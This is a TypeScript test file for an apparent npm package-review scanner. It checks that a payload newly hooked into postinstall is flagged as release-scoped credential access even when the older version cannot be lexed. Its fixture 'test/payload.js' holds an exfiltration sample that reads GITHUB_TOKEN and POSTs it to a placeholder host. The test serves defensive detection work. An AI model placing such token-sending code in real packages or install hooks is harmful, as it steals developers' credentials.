import { describe, expect, test, vi } from "vitest";
import { parsePackageJson } from "../server/lib/tar-parser.js";
import {
  annotateFindingsWithDiffStatus,
  createPackageDiff,
  deterministicFindings,
  type FileRecord,
} from "../server/lib/review";

// The bounded lexer gives up only on inputs no real file reaches, so the test
// forces it for any source carrying a marker.
vi.mock("../server/lib/platform/js-lexer", async (importOriginal) => {
  const original = await importOriginal<typeof import("../server/lib/platform/js-lexer")>();
  return {
    ...original,
    tokenizeJsWithinBudget: (...args: Parameters<typeof original.tokenizeJsWithinBudget>) =>
      args[0].includes("LEXER_GIVES_UP") ? null : original.tokenizeJsWithinBudget(...args),
  };
});

function file(path: string, textSample: string): FileRecord {
  return { path, size: textSample.length, sha256: path + textSample.length, flags: [], textSample };
}

describe("install reachability when the previous side cannot be lexed", () => {
  test("credits nothing as already reachable, so a newly hooked payload stays release scoped", () => {
    const manifest = (version: string, script: string) =>
      JSON.stringify({ name: "pkg", version, scripts: { postinstall: script } });
    // `a.js` only mentions the payload in a string. Read without its tokens,
    // that mention counts, and the payload would look install-reachable before.
    const shared = [
      file("a.js", `// LEXER_GIVES_UP\nconst note = "require('./test/payload.js')";\n`),
      file("b.js", "require('./test/payload.js');\n"),
      file(
        "test/payload.js",
        "const token = process.env.GITHUB_TOKEN;\nfetch('https://example.invalid/c', { method: 'POST', body: token });\n",
      ),
    ];
    const previous = [file("package.json", manifest("1.0.0", "node a.js")), ...shared];
    const staged = [file("package.json", manifest("1.0.1", "node b.js")), ...shared];
    const diff = createPackageDiff(previous, staged);
    const parsed = parsePackageJson(staged);
    const summary = parsed ? { ...parsed, bin: undefined } : null;
    const findings = deterministicFindings(staged, diff, summary, {
      previousFiles: previous,
    });
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });

    expect(annotated).toContainEqual(
      expect.objectContaining({
        ruleId: "code.credential-access",
        file: "test/payload.js",
        diffStatus: "unchanged",
        releaseDelta: true,
      }),
    );
  });
});
